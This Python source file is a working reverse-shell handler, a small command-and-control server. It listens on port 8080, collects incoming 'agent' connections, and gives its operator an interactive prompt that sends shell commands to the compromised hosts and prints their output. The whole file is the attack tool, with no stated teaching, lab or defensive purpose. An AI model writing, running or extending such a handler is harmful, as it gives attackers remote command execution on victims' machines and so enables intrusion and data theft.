import socket
import threading
from dataclasses import dataclass


@dataclass
class Agent:
    _sock: socket.socket

    _RECV_BUFSIZE = 4096

    def __post_init__(self):
        self._sock.settimeout(3)

    def run_shell_cmd(self, cmd: str, binary=False):
        self._sock.send(f'{cmd}\n'.encode())
        data = self._sock.recv(self._RECV_BUFSIZE)
        if binary:
            return data
        return data.decode().strip()

    def attach_shell(self):
        while True:
            try:
                cmd = input('> ')
                if cmd == 'exit':
                    break
                print(self.run_shell_cmd(cmd))
            except KeyboardInterrupt:
                break

    def __repr__(self):
        return f'Agent @ {self._sock.getpeername()[0]}'


class Server:
    def __init__(self, port: int) -> None:
        self.port = port
        self.sock = None
        self.agents = []

    def start(self) -> None:
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('', self.port))
        self.sock.listen(1)
        threading.Thread(target=self._recv_agents, daemon=True).start()
        print(f'Server started on port {self.port}.')

    def stop(self):
        self.sock.close()
        print('Server stopped.')

    def _recv_agents(self):
        while True:
            agent_sock, addr = self.sock.accept()
            self.agents.append(Agent(agent_sock))
            print(f'Received new agent connection from {addr}')


server = Server(port=8080)
server.start()
